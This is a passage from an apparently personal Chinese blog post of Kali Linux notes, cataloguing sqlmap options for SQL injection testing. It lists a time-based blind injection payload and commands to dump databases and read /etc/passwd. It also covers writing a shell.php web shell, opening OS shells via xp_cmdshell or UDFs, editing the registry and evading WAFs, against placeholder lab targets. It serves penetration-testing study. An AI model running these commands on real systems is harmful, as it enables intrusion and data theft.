-<pre><code>⭐WEB渗透需要深入掌握SQL漏洞的原理以及注入</code></pre></blockquote>
-<h4 id="2-SQLMAP–检测技术"><a href="#2-SQLMAP–检测技术" class="headerlink" title="2. SQLMAP–检测技术"></a>2. SQLMAP–检测技术</h4><ul>
-<li>基于布尔的盲注检测（真/假）</li>
-<li>基于时间的盲注检测（响应时间长短）<ul>
-<li>‘and (select * from (select(sleep(20)))a)–+</li>
-</ul>
-</li>
-<li>基于错误的检测</li>
-<li>基于UNION联合查询的检测<ul>
-<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
-</ul>
-</li>
-<li>基于堆叠查询的检测<ul>
-<li>;堆叠多个查询语句</li>
-<li>适用于非select的数据修改、删除操作</li>
-</ul>
-</li>
-<li>支持的数据库管理系统DBMS<ul>
-<li>MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐NOSQLMAP可以查询NOSQL数据库里面的类型（非关系型数据库）</code></pre></blockquote>
-<h4 id="3-SQLMAP–其他特性"><a href="#3-SQLMAP–其他特性" class="headerlink" title="3. SQLMAP–其他特性"></a>3. SQLMAP–其他特性</h4><ul>
-<li>数据库直接连接-d<ul>
-<li>不通过SQL注入，制定身份认证信息、IP、端口（Orcal 121，SQL Server 3433）</li>
-</ul>
-</li>
-<li>与burpsuite、google结合使用，支持政策表达式限定测试目标</li>
-<li>Get、Post、Cookie、Referer、User-Agent（随机或指定目标）<ul>
-<li>Cookie过期后自动处理Set-Cookie头，更新Cookie信息（SQLMAP自动探测）</li>
-</ul>
-</li>
-<li>限制：最大并发，延迟发送</li>
-<li>支持Basic、Digest、NTLM、客户端CA身份认证（软证书+pin码，对客户端的身份认证）</li>
-<li>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称（无法进行union select）</li>
-<li>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表</li>
-<li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li>
-</ul>
-<h4 id="4-SQLMAP–安装与更新"><a href="#4-SQLMAP–安装与更新" class="headerlink" title="4. SQLMAP–安装与更新"></a>4. SQLMAP–安装与更新</h4><ul>
-<li>基于python2.7开发</li>
-<li>安装<ul>
-<li><strong><code>🔺命令：apt-get install git</code></strong></li>
-<li><strong><code>🔺命令：git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></strong></li>
-</ul>
-</li>
-<li>升级<ul>
-<li><strong><code>🔺命令：sqlmap --update</code></strong> 在线</li>
-<li><strong><code>🔺命令：git pull</code></strong> 离线</li>
-</ul>
-</li>
-<li>Kali集成版随Kali库更新（Kali rolling版本可以直接通过update、upgrade）</li>
-</ul>
-<blockquote>
-<pre><code>⭐Kali集成版更新（▲ 2020.1.15 更新可能在bash中找不到sqlmap）
-1.git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-2.sqlmap --update</code></pre></blockquote>
-<h4 id="5-SQLMAP–Options-Target参数"><a href="#5-SQLMAP–Options-Target参数" class="headerlink" title="5. SQLMAP–Options/Target参数"></a>5. SQLMAP–Options/Target参数</h4><ul>
-<li>Options<ul>
-<li>-h（显示粗略信息)</li>
-<li>-hh（显示详细信息）</li>
-<li>–version（SQLMAP版本信息）</li>
-<li>-v （版本信息，分为0-5级，默认为1级）</li>
-</ul>
-</li>
-<li>Target<ul>
-<li>-d（直接连接，作为数据库的客户端）</li>
-<li>-u（URL地址，需要有变量名称）</li>
-<li>-l（log file记录日志，可以来自Burp or webscarab）</li>
-<li>-x（站点地图，可以提交以xml文件的形式）</li>
-<li>-m（url地址表，多个url地址保存为文本文件）</li>
-<li>-r（http头请求信息提交，保存http头请求信息）</li>
-<li>-g（Google搜索引擎，正则表达式）</li>
-<li>-c（配置文件，保存扫描的配置文件）</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-SQLMAP–Target-→-直接连接"><a href="#6-SQLMAP–Target-→-直接连接" class="headerlink" title="6. SQLMAP–Target → 直接连接"></a>6. SQLMAP–Target → 直接连接</h4><ul>
-<li>直接方法<ul>
-<li>sqlmap -d “mysql://user:<a href="mailto:password@192.168.1.1" target="_blank" rel="noopener">password@192.168.1.1</a>:3306/dvwa”</li>
-<li>–users（数据库的管理账号）</li>
-<li>–banner（目标系统版本，数据库类型版本）</li>
-<li>–dbs（查询目标数据库管理系统的库）</li>
-<li>–schema（源数据库）</li>
-<li>-a（所有数据信息）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐查询结果，默认保存在：/root/.sqlmap/output/中</code></pre></blockquote>
-<h4 id="7-SQLMAP–Target-→-Get方法"><a href="#7-SQLMAP–Target-→-Get方法" class="headerlink" title="7. SQLMAP–Target → Get方法"></a>7. SQLMAP–Target → Get方法</h4><ul>
-<li>Get方法<ul>
-<li>sqlmap -u “<a href="http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;" target="_blank" rel="noopener">http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;</a> -p（只检查） username -f（数据库的指纹）</li>
-<li><ul>
-<li>–users（数据库的管理账号）</li>
-</ul>
-</li>
-<li>–banner（目标系统版本，数据库类型版本）</li>
-<li>–dbs（查询目标数据库管理系统的库）</li>
-<li>–schema（源数据库）</li>
-<li>-a（所有数据信息）</li>
-</ul>
-</li>
-</ul>
-<h4 id="8-SQLMAP–Target-→-扫描URL列表文件"><a href="#8-SQLMAP–Target-→-扫描URL列表文件" class="headerlink" title="8. SQLMAP–Target → 扫描URL列表文件"></a>8. SQLMAP–Target → 扫描URL列表文件</h4><ul>
-<li>扫描URL列表文件<ul>
-<li><a href="http://1.1.1.1/vuln1.php?q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php?q=foobar</a></li>
-<li><a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*</li>
-<li>sqlmap -m list.txt</li>
-</ul>
-</li>
-</ul>
-<h4 id="9-SQLMAP–Target-→-扫描Google搜索结果"><a href="#9-SQLMAP–Target-→-扫描Google搜索结果" class="headerlink" title="9. SQLMAP–Target → 扫描Google搜索结果"></a>9. SQLMAP–Target → 扫描Google搜索结果</h4><ul>
-<li>扫描Google搜索结果（需要代理链，配置才能使用）<ul>
-<li>sqlmap.py -g “inurl:&quot;.php?id=1&quot;“</li>
-</ul>
-</li>
-</ul>
-<h4 id="10-SQLMAP–Target-→-POST方法"><a href="#10-SQLMAP–Target-→-POST方法" class="headerlink" title="10. SQLMAP–Target → POST方法"></a>10. SQLMAP–Target → POST方法</h4><ul>
-<li>使用http请求文件（burpsuite）<ul>
-<li>使用Burp，设置浏览器代理，POST提交数据的登录形式</li>
-<li>复制http请求头，gedit黏贴在新建request.txt中</li>
-<li>sqlmap -r request.txt（通过Burp抓取请求的文件）</li>
-</ul>
-</li>
-<li>使用burpsuite log文件<ul>
-<li>Options → Misc → Project Logging → Proxy Requests</li>
-<li>保存为log.txt，发送Http请求（关闭Intercept）</li>
-<li>sqlmap -l log.txt</li>
-</ul>
-</li>
-</ul>
-<h4 id="11-SQLMAP–Target-→-HTTPS"><a href="#11-SQLMAP–Target-→-HTTPS" class="headerlink" title="11. SQLMAP–Target → HTTPS"></a>11. SQLMAP–Target → HTTPS</h4><ul>
-<li>sqlmap -u “<a href="https://1.1.1.1/a.php?id=1:8843&quot;" target="_blank" rel="noopener">https://1.1.1.1/a.php?id=1:8843&quot;</a> –force-ssl</li>
-</ul>
-<h4 id="12-SQLMAP–Target-→-扫描配置文件"><a href="#12-SQLMAP–Target-→-扫描配置文件" class="headerlink" title="12. SQLMAP–Target → 扫描配置文件"></a>12. SQLMAP–Target → 扫描配置文件</h4><ul>
-<li>查找sqlmap.conf（/etc/sqlmap/sqlmap.conf）</li>
-<li>sqlmap -c sqlmap.conf</li>
-</ul>
-<h4 id="13-SQLMAP–REQUEST-→-数据段"><a href="#13-SQLMAP–REQUEST-→-数据段" class="headerlink" title="13. SQLMAP–REQUEST → 数据段"></a>13. SQLMAP–REQUEST → 数据段</h4><ul>
-<li>数据段： –data<ul>
-<li>get/post都适用</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”user=1&amp;pass=2（get的url参数部分/post的源代码）” -f</li>
-</ul>
-</li>
-</ul>
-<h4 id="14-SQLMAP–REQUEST-→-变量分隔符"><a href="#14-SQLMAP–REQUEST-→-变量分隔符" class="headerlink" title="14. SQLMAP–REQUEST → 变量分隔符"></a>14. SQLMAP–REQUEST → 变量分隔符</h4><ul>
-<li>变量分隔符： –param-del<ul>
-<li><a href="http://1.1.1.1/a.php?q=foo;id=1" target="_blank" rel="noopener">http://1.1.1.1/a.php?q=foo;id=1</a>  //  ;  &amp;</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”q=foo;id=1” –param-del=”;” -f</li>
-</ul>
-</li>
-</ul>
-<h4 id="15-SQLMAP–REQUEST-→-Cookie头"><a href="#15-SQLMAP–REQUEST-→-Cookie头" class="headerlink" title="15.SQLMAP–REQUEST → Cookie头"></a>15.SQLMAP–REQUEST → Cookie头</h4><ul>
-<li>–cookie</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=12&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=12&quot;</a> –cookie=”a=1；b=2（Cooke的值）” -f </li>
-<li>web应用需要基于cookie的身份认证</li>
-<li>检查存在cookie中的注入点（sqlmap自动测试）</li>
-<li>Set-Cookie/–drop-set-cookie</li>
-</ul>
-<blockquote>
-<pre><code>⭐SQLMAP扫描的Level1不会扫描cookie中存在的漏洞，至少得从Level2开始，--level 2</code></pre></blockquote>
-<h4 id="16-SQLMAP–REQUEST-→-Agent"><a href="#16-SQLMAP–REQUEST-→-Agent" class="headerlink" title="16. SQLMAP–REQUEST → Agent"></a>16. SQLMAP–REQUEST → Agent</h4><ul>
-<li>–user-agent<ul>
-<li>sqlmap/1.0-dev-xxxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –user-agent=”aaaaaa” –dbs</li>
-</ul>
-</li>
-<li>–random-agent<ul>
-<li>/usr/share/sqlmap/txt/yser-agents.txt</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –random-agent –dbs</li>
-</ul>
-</li>
-<li>sqlmap检查user-agent中的注入点：Level&gt;=3</li>
-<li>APP/WAF/IPS/IDS过滤异常user-agent时报错<ul>
-<li>[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code,try to force the HTTP User-Agent header with option –useragent or –random-agent</li>
-</ul>
-</li>
-</ul>
-<h4 id="17-SQLMAP–REQUEST-→-Host-Referer-额外的header"><a href="#17-SQLMAP–REQUEST-→-Host-Referer-额外的header" class="headerlink" title="17. SQLMAP–REQUEST → Host/Referer/额外的header"></a>17. SQLMAP–REQUEST → Host/Referer/额外的header</h4><ul>
-<li>Host头：–host<ul>
-<li>Level=5</li>
-</ul>
-</li>
-<li>Referer头：–referer<ul>
-<li>Level&gt;=3</li>
-</ul>
-</li>
-<li>额外的header：–headers<ul>
-<li>每个头单独一行（名称区分大小写，大小写敏感）</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –headers=”Host:<a href="http://www.a.com\nUser-Agent:yuanfh&quot;" target="_blank" rel="noopener">www.a.com\nUser-Agent:yuanfh&quot;</a></li>
-</ul>
-</li>
-<li>–method=GET/POST（发送请求的方法，指定请求方法）</li>
-</ul>
-<h4 id="18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证"><a href="#18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证" class="headerlink" title="18. SQLMAP–REQUEST → 基于HTTP协议的身份验证"></a>18. SQLMAP–REQUEST → 基于HTTP协议的身份验证</h4><ul>
-<li>基于HTTP协议的身份验证<ul>
-<li>Basic</li>
-<li>Digest</li>
-<li>NTLM</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –auth-type Basic –auth-cred “user:pass”</li>
-</ul>
-</li>
-<li>–auth-cert/–auth-file（基于客户端证书的身份认证）<ul>
-<li>–auth-file=”ca.PEM”</li>
-<li>含有私钥的PEM格式证书文件</li>
-<li>PEM格式的证书链文件</li>
-</ul>
-</li>
-</ul>
-<h4 id="19-SQLMAP–REQUEST-→-http-s-代理"><a href="#19-SQLMAP–REQUEST-→-http-s-代理" class="headerlink" title="19. SQLMAP–REQUEST → http(s)代理"></a>19. SQLMAP–REQUEST → http(s)代理</h4><ul>
-<li>http(s)代理（搜索引起：inurl:.php?id=）<ul>
-<li>–proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a></li>
-<li>–proxy=”socks5://127.0.0.1:8087”</li>
-<li>–proxy-cred=”name:pass”（代理的身份认证）</li>
-<li>–ignore-proxy（忽略系统级代理设置，通常用于扫描本地网络目标）</li>
-</ul>
-</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a> -f</li>
-</ul>
-<h4 id="20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize"><a href="#20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize" class="headerlink" title="20. SQLMAP–REQUEST → delay/timeout/retries/randomize"></a>20. SQLMAP–REQUEST → delay/timeout/retries/randomize</h4><ul>
-<li>–delay<ul>
-<li>每次http(s)请求之间的延迟时间，浮点数，单位为秒，默认无延迟</li>
-</ul>
-</li>
-<li>–timeout<ul>
-<li>请求超时时间，浮点数，默认为30秒</li>
-</ul>
-</li>
-<li>–retries<ul>
-<li>http(s)连接超时重试次数，默认为3秒</li>
-</ul>
-</li>
-<li>–randomize<ul>
-<li>长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=100&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=100&quot;</a> –randomize=”id”</li>
-</ul>
-</li>
-</ul>
-<h4 id="21-SQLMAP–REQUEST-→-scope-safe"><a href="#21-SQLMAP–REQUEST-→-scope-safe" class="headerlink" title="21. SQLMAP–REQUEST → scope/safe"></a>21. SQLMAP–REQUEST → scope/safe</h4><ul>
-<li>–scope<ul>
-<li>过滤日志内容，通过正则表达式筛选扫描对象</li>
-<li>sqlmap -l burp.log –scope=”(www)?.target.(com|net|org)”</li>
-<li>sqlmap -l 2.log –scope=”(19)?.168.20.(1|10|100)” –level 3 –dbs</li>
-<li>▲ User-agent中的注入点</li>
-</ul>
-</li>
-<li>–safe-url/–safe-freq（两个需同时使用）<ul>
-<li>检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁Session</li>
-<li>每发送–safe-freq次注入请求后，发送一次正常请求</li>
-</ul>
-</li>
-</ul>
-<h4 id="22-SQLMAP–REQUEST-→-skip-urlencode-eval"><a href="#22-SQLMAP–REQUEST-→-skip-urlencode-eval" class="headerlink" title="22. SQLMAP–REQUEST → skip-urlencode/eval"></a>22. SQLMAP–REQUEST → skip-urlencode/eval</h4><ul>
-<li>–skip-urlencode<ul>
-<li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li>
-</ul>
-</li>
-<li>–eval<ul>
-<li>每次请求前执行指定的python代码</li>
-<li>每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）</li>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</li>
-</ul>
-</li>
-</ul>
-<h4 id="23-SQLMAP–Optimization参数（性能优化）"><a href="#23-SQLMAP–Optimization参数（性能优化）" class="headerlink" title="23. SQLMAP–Optimization参数（性能优化）"></a>23. SQLMAP–Optimization参数（性能优化）</h4><ul>
-<li>-o（开启所有参数的优化，除threads参数外）</li>
-<li>–predict-output</li>
-<li>–keep-alive</li>
-<li>–null-connection</li>
-<li>–threads=THREADS</li>
-</ul>
-<h4 id="24-SQLMAP–Optimization-→-predict-output"><a href="#24-SQLMAP–Optimization-→-predict-output" class="headerlink" title="24. SQLMAP–Optimization → predict-output"></a>24. SQLMAP–Optimization → predict-output</h4><ul>
-<li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li>
-<li>版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li>
-<li>▲ 与–threads参数不兼容</li>
-<li>统计表：/usr/share/sqlmap/txt/common-outputs.txt</li>
-</ul>
-<h4 id="25-SQLMAP–Optimization-→-Keep-alive"><a href="#25-SQLMAP–Optimization-→-Keep-alive" class="headerlink" title="25. SQLMAP–Optimization → Keep alive"></a>25. SQLMAP–Optimization → Keep alive</h4><ul>
-<li>–keep alive</li>
-<li>使用http(s)长连接，性能好</li>
-<li>▲ 与–proxy参数不兼容</li>
-<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li>
-</ul>
-<h4 id="26-SQLMAP–Optimization-→-null-connection"><a href="#26-SQLMAP–Optimization-→-null-connection" class="headerlink" title="26. SQLMAP–Optimization → null-connection"></a>26. SQLMAP–Optimization → null-connection</h4><ul>
-<li>–null-connection</li>
-<li>只获取相应页面的大小值，而非页面具体内容</li>
-<li>通常用于盲注判断真/假，降低网络带宽消耗</li>
-<li>▲ 与–text-only参数不兼容（基于页面内容的比较判断真/假）</li>
-</ul>
-<h4 id="27-SQLMAP–Optimization-→-threads"><a href="#27-SQLMAP–Optimization-→-threads" class="headerlink" title="27. SQLMAP–Optimization → threads"></a>27. SQLMAP–Optimization → threads</h4><ul>
-<li>–threads=THREADS</li>
-<li>最大并发线程</li>
-<li>盲注时每个线程获取一个字符（每个线程7次请求），获取完成后线程结束</li>
-<li>默认值为1，建议不要超过10，否则可能影响目标站点可用性</li>
-<li>▲ 与–predict-output参数不兼容</li>
-</ul>
-<blockquote>
-<pre><code>⭐7次请求即可以获取到一个ASCII码字符，即可打印字符为128个</code></pre></blockquote>
-<h4 id="28-SQLMAP–ENUMERATION-→-枚举数据库数据"><a href="#28-SQLMAP–ENUMERATION-→-枚举数据库数据" class="headerlink" title="28. SQLMAP–ENUMERATION → 枚举数据库数据"></a>28. SQLMAP–ENUMERATION → 枚举数据库数据</h4><ul>
-<li>–current-user（当前数据库管理系统账号）</li>
-<li>–current-db（当前数据库管理系统的数据库）</li>
-<li>–hostname（当前机器主机名）</li>
-<li>–users（数据库管理系统所有账号）</li>
-<li>–privileges -U username（CU当前账号）</li>
-<li>–roles（数据库角色）</li>
-<li>–dbs（数据库管理系统所有的数据库）</li>
-<li>–tables、–colums、–exclude-sysdbs（排除系统库）</li>
-<li>-D db（指定所使用的数据库）</li>
-<li>-T table（指定所使用的数据表）</li>
-<li>-C user –colusms（指定某个列）</li>
-<li>–schema（表结构）–batch（批处理） –exclude-sysdbs 元数据（使用默认选项）</li>
-<li>–count（表的行数）</li>
-</ul>
-<h4 id="29-SQLMAP–ENUMERATION-→-具体数据操作"><a href="#29-SQLMAP–ENUMERATION-→-具体数据操作" class="headerlink" title="29. SQLMAP–ENUMERATION → 具体数据操作"></a>29. SQLMAP–ENUMERATION → 具体数据操作</h4><ul>
-<li>Dump数据<ul>
-<li>–dump,-C,-T,-D,–start,–stop</li>
-<li>–dump-all –exclude-sysdbs</li>
-<li>–sql-query “select * from users”</li>
-</ul>
-</li>
-</ul>
-<h4 id="30-SQLMAP–BRUFE-FORCE（暴力破解）"><a href="#30-SQLMAP–BRUFE-FORCE（暴力破解）" class="headerlink" title="30. SQLMAP–BRUFE FORCE（暴力破解）"></a>30. SQLMAP–BRUFE FORCE（暴力破解）</h4><ul>
-<li>Mysql&lt;5.0，没有information_schema库</li>
-<li>Mysql&gt;=5.0，但无权读取information_schema库</li>
-<li>微软的access数据库，默认无权读取MSysObjects库</li>
-<li>–common-tables</li>
-<li>–common-columns（Access系统表无列信息）</li>
-</ul>
-<h4 id="31-SQLMAP–UDF-INJECTION（用户自定义函数注入）"><a href="#31-SQLMAP–UDF-INJECTION（用户自定义函数注入）" class="headerlink" title="31. SQLMAP–UDF INJECTION（用户自定义函数注入）"></a>31. SQLMAP–UDF INJECTION（用户自定义函数注入）</h4><ul>
-<li>–udf-inject,–share-lib<ul>
-<li>编译共享库创建并上传至DB Server，以此生成UDF实现高级注入</li>
-<li>Linux：shared object</li>
-<li>Windows：DLL</li>
-<li><a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857" target="_blank" rel="noopener">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</a></li>
-</ul>
-</li>
-</ul>
-<h4 id="32-SQLMAP–FILE-SYSTEM（文件系统）"><a href="#32-SQLMAP–FILE-SYSTEM（文件系统）" class="headerlink" title="32. SQLMAP–FILE SYSTEM（文件系统）"></a>32. SQLMAP–FILE SYSTEM（文件系统）</h4><ul>
-<li>–file-read=”/etc/passwd”</li>
-<li>–file-write=”shell.php” –file-dest=”/tmp/shell.php”</li>
-</ul>
-<h4 id="33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）"><a href="#33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）"></a>33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）</h4><ul>
-<li>–os-cmd id（执行一个命令）</li>
-<li>–os-shell</li>
-<li>–sql-shell</li>
-<li>Mysql、postgresql<ul>
-<li>上传共享库并生成sys_exec()、sys_eval()两个UDF</li>
-</ul>
-</li>
-<li>Mssql<ul>
-<li>xp_cmdshell存储过程（有就用，禁了启，没有建）</li>
-</ul>
-</li>
-</ul>
-<h4 id="34-SQLMAP–WINDOWS-REGISTORY（Windows）"><a href="#34-SQLMAP–WINDOWS-REGISTORY（Windows）" class="headerlink" title="34. SQLMAP–WINDOWS REGISTORY（Windows）"></a>34. SQLMAP–WINDOWS REGISTORY（Windows）</h4><ul>
-<li>–reg-read</li>
-<li>–reg-add</li>
-<li>–reg-del</li>
-<li>–reg-key、–reg-value、–reg-data、–reg-type</li>
-<li>sqlmap –u=”<a href="http://1.1.1.1/a.aspx?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.aspx?id=1&quot;</a> –reg-add –regkey=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test -reg-type=REG_SZ –reg-data=1</li>
-</ul>
-<h4 id="35-SQLMAP–GENERAL（一般性参数）"><a href="#35-SQLMAP–GENERAL（一般性参数）" class="headerlink" title="35. SQLMAP–GENERAL（一般性参数）"></a>35. SQLMAP–GENERAL（一般性参数）</h4><ul>
-<li>-s（sqlite会话文件保存位置）</li>
-<li>-t（记录流量文件保存位置）</li>
-<li>–charset（强制字符编码）<ul>
-<li>–charset=GBK</li>
-</ul>
-</li>
-<li>–crawl（从起始位置爬站深度）<ul>
-<li>–batch –crawl=3</li>
-</ul>
-</li>
-<li>–csv-del（dump数据默认存于”,”分割的CSV文件，指定其他分隔符）<ul>
-<li>–csv-del=”;”</li>
-</ul>
-</li>
-<li>–dbms-cred（指定数据库账号）</li>
-<li>–flush-session（清空session）</li>
-<li>–force-ssl（https链接）</li>
-<li>–fresh-queries（忽略session查询结果）</li>
-<li>–hex（dump非ASCII码字符内容时，将其编码为16进制形式，收到后解码还原，防过滤）<ul>
-<li>sqlmap -u “<a href="http://1.1.1.1/s.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/s.php?id=1&quot;</a> –hex -v 3</li>
-</ul>
-</li>
-<li>–output-dir=/tmp</li>
-<li>–parse-errors（分析和现实数据库内建报错信息）<ul>
-<li>sqlmap -u “<a href="http://1.1.1.1/sqlmap/a.asp?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/sqlmap/a.asp?id=1&quot;</a> –parse-errors</li>
-</ul>
-</li>
-<li>–save（将命令保存成配置文件）</li>
-</ul>
-<h4 id="36-SQLMAP–MISCELLANEOUS-→-助记符（-z）"><a href="#36-SQLMAP–MISCELLANEOUS-→-助记符（-z）" class="headerlink" title="36. SQLMAP–MISCELLANEOUS → 助记符（-z）"></a>36. SQLMAP–MISCELLANEOUS → 助记符（-z）</h4><ul>
-<li>-z（参数助记符）</li>
-<li>原：sqlmap –batch –random-agent –ignore-proxy –technique=BEU -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
-<li>后：sqlmap -z “bat,randoma,ign,tec=BEU” -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
-<li>原：sqlmap –ignore-proxy –flush-session –technique=U –dump -D testdb -T users -u “1.1.1.1/a.php?id=1” </li>
-<li>后：sqlmap -z “ign,flu,bat,tec=U,dump,D=testdb,T=users” -u “1.1.1.1/ vuln.php?id=1”</li>
-</ul>
-<h4 id="37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）"><a href="#37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）"></a>37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）</h4><ul>
-<li>–answer<ul>
-<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –technique=E –answers=”extending=N” –batch</li>
-</ul>
-</li>
-<li>–check-waf（检测WAF/IPS/IDS）（▲ 2020.1.15此参数更新后暂无）</li>
-<li>–hpp（HTTP parameter pollution，Web Application的一个漏洞）<ul>
-<li>绕过WAF/IPS/IDS的有效方法</li>
-<li>尤其对ASP/IIS和ASP.NET/IIS</li>
-</ul>
-</li>
-<li>–identify-waf（彻底的waf/ips/ids检查）<ul>
-<li>检查30多种产品</li>
-</ul>
-</li>
-</ul>
-<h4 id="38-SQLMAP–MISCELLANEOUS-→-Misc"><a href="#38-SQLMAP–MISCELLANEOUS-→-Misc" class="headerlink" title="38. SQLMAP–MISCELLANEOUS → Misc"></a>38. SQLMAP–MISCELLANEOUS → Misc</h4><ul>
-<li>–mobile（模拟智能手机设备）</li>
-<li>–purge-output（清除output文件夹）（▲ 2020.1.15修改参数为–purge）</li>
-<li>–smart（当有大量检测目标时，只选择基于错误的检测结果）</li>
-<li>–wizard（sqlmap向导）</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/" itemprop="url">Kali Linux笔记(五十)：手动漏洞挖掘--SQL盲注</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:12:46+08:00">
-                2020-01-14
-              </time>
-            
-
-            
